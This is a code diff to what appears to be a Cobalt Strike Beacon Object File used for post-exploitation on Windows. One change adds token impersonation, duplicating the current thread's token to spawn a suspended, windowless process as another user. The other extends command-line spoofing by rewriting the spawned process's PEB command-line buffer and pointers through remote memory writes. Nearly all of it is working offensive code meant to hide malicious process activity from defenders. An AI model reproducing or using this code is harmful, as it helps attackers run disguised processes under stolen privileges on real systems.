@@ -372,11 +372,36 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
     DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
     if (attrCount > 0) flags |= EXTENDED_STARTUPINFO_PRESENT;
 
-    if (!KERNEL32$CreateProcessA(NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
-            flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi)) {
-        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA: %lu", KERNEL32$GetLastError());
-        SpawnCleanup(ctx, FALSE);
-        return FALSE;
+    {
+        HANDLE hImpToken = NULL;
+        HANDLE hPrimToken = NULL;
+        BOOL tokenCreate = FALSE;
+
+        if (ADVAPI32$OpenThreadToken((HANDLE)(LONG_PTR)-2,
+                TOKEN_DUPLICATE | TOKEN_QUERY, FALSE, &hImpToken)) {
+            if (ADVAPI32$DuplicateTokenEx(hImpToken, MAXIMUM_ALLOWED, NULL,
+                    SecurityImpersonation, TokenPrimary, &hPrimToken)) {
+                tokenCreate = ADVAPI32$CreateProcessAsUserA(hPrimToken,
+                    NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
+                    flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi);
+                if (tokenCreate)
+                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created process with impersonation token");
+                else
+                    BeaconPrintf(CALLBACK_OUTPUT, "[!] CreateProcessAsUserA: %lu, fallback",
+                        KERNEL32$GetLastError());
+                KERNEL32$CloseHandle(hPrimToken);
+            }
+            KERNEL32$CloseHandle(hImpToken);
+        }
+
+        if (!tokenCreate) {
+            if (!KERNEL32$CreateProcessA(NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
+                    flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi)) {
+                BeaconPrintf(CALLBACK_ERROR, "CreateProcess: %lu", KERNEL32$GetLastError());
+                SpawnCleanup(ctx, FALSE);
+                return FALSE;
+            }
+        }
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned %s (PID %lu) suspended", spawntoA, ctx->pi.dwProcessId);
@@ -428,9 +453,27 @@ static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
 
     KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, wideBuf, wideLen);
 
+    USHORT realSizeBytes = (USHORT)(wideLen * sizeof(WCHAR));
+    PVOID pTargetBuf = params.CommandLine.Buffer;
     SIZE_T bw = 0;
-    KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wideBuf,
-                                wideLen * sizeof(WCHAR), &bw);
+
+    if (realSizeBytes > params.CommandLine.MaximumLength) {
+        pTargetBuf = KERNEL32$VirtualAllocEx(hProcess, NULL, realSizeBytes,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!pTargetBuf) {
+            KERNEL32$LocalFree(wideBuf);
+            return FALSE;
+        }
+        KERNEL32$WriteProcessMemory(hProcess,
+            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer),
+            &pTargetBuf, sizeof(PVOID), &bw);
+        USHORT newMax = realSizeBytes;
+        KERNEL32$WriteProcessMemory(hProcess,
+            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength),
+            &newMax, sizeof(USHORT), &bw);
+    }
+
+    KERNEL32$WriteProcessMemory(hProcess, pTargetBuf, wideBuf, realSizeBytes, &bw);
 
     USHORT newLen = (USHORT)((wideLen - 1) * sizeof(WCHAR));
     KERNEL32$WriteProcessMemory(hProcess,
